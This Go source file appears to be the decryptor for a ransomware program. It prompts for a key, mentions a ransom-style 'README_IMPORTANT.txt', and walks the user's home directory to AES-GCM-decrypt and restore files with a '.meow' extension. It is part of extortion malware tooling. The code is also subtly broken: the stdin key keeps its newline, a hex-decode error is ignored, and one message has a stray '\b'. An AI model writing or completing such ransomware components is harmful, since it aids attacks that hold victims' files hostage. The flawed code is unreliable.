package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"strings"
)

func decrypt(fileString, keyString string) {
	fileData, err := os.ReadFile(fileString)
	if err != nil {
		fmt.Printf("error reading file: %v\b", err)
		return
	}

	keyHex, _ := hex.DecodeString(keyString)

	block, err := aes.NewCipher(keyHex)
	if err != nil {
		log.Fatal("err on NewCipher: ", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal("err on NewGCM: ", err)
	}

	nonceSize := aesGCM.NonceSize()
	if len(fileData) < nonceSize {
		log.Fatal("encrypted data too short")
	}

	nonce, cipherText := fileData[:nonceSize], fileData[nonceSize:]

	plainText, err := aesGCM.Open(nil, nonce, cipherText, nil)
	if err != nil {
		log.Fatal("err on aesGCM.Open: ", err)
	}

	if strings.HasSuffix(fileString, ".meow") {
		newPath := strings.TrimSuffix(fileString, ".meow")
		os.WriteFile(newPath, plainText, 0644)
		os.Remove(fileString)
	}
}

func main() {
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Print(`hey, buddy! check README_IMPORTANT.txt just in case!

enter decryption key: `)
	providedKey, _ := reader.ReadString('\n')

	homeDir := usr.HomeDir

	fileFormats := []string{
		".meow",
	}

	makeFileFormats := make(map[string]bool)
	for _, ext := range fileFormats {
		makeFileFormats[ext] = true
	}

	err = filepath.WalkDir(homeDir, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return nil
		}

		if !d.IsDir() {
			ext := strings.ToLower(filepath.Ext(d.Name()))
			if makeFileFormats[ext] {
				fmt.Println("decrypting: " + path)
				decrypt(path, providedKey)
			}
		}
		return nil
	})

	if err != nil {
		fmt.Printf("error walking the path: %v\n", err)
	}
}
